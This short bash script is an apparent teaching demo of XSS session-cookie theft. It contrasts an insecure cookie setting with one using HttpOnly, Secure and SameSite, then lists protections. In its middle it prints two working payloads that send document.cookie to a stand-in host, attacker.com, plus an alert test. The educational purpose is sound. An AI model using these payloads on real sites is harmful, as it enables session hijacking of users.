#!/bin/bash

# XSS Session Cookie Stealer Test Script
# This script demonstrates how XSS can be used to read session cookies

echo "🔍 XSS Session Cookie Vulnerability Test"
echo "========================================"
echo ""
echo "This script demonstrates how XSS can be used to read session cookies"
echo "when they are not properly secured with HttpOnly, Secure, and SameSite flags."
echo ""

# Show the vulnerable cookie setting
echo "❌ VULNERABLE COOKIE SETTING (from vulnerable_version/sharepy/backend/main.py):"
echo "   response.set_cookie('session', token)  # Missing security flags!"
echo ""

# Show the secure cookie setting
echo "✅ SECURE COOKIE SETTING (from secure_version/sharepy/backend/main.py):"
echo "   response.set_cookie("
echo "       'session',"
echo "       token,"
echo "       secure=True,      # HTTPS only"
echo "       httponly=True,    # No JavaScript access"
echo "       samesite='strict' # CSRF protection"
echo "   )"
echo ""

# Show XSS payloads
echo "🚨 XSS PAYLOADS THAT CAN STEAL SESSION COOKIES:"
echo ""
echo "1. Basic cookie theft:"
echo "   <script>document.location='http://attacker.com/steal?cookie='+document.cookie</script>"
echo ""
echo "2. More sophisticated theft:"
echo "   <script>var xhr=new XMLHttpRequest();xhr.open('POST','http://attacker.com/steal');"
echo "   xhr.setRequestHeader('Content-Type','application/json');"
echo "   xhr.send(JSON.stringify({cookie:document.cookie}));</script>"
echo ""
echo "3. Simple alert (for testing):"
echo "   <script>alert(document.cookie)</script>"
echo ""

echo "🛡️  HOW TO PROTECT:"
echo "   1. Always set HttpOnly flag to prevent JavaScript access"
echo "   2. Set Secure flag to only send over HTTPS"
echo "   3. Set SameSite flag to prevent CSRF attacks"
echo "   4. Implement proper input validation and sanitization"
echo "   5. Use Content Security Policy (CSP) headers"
echo ""

echo "⚠️  WARNING: This is for educational purposes only."
echo "   Only test on applications you own or have explicit permission to test."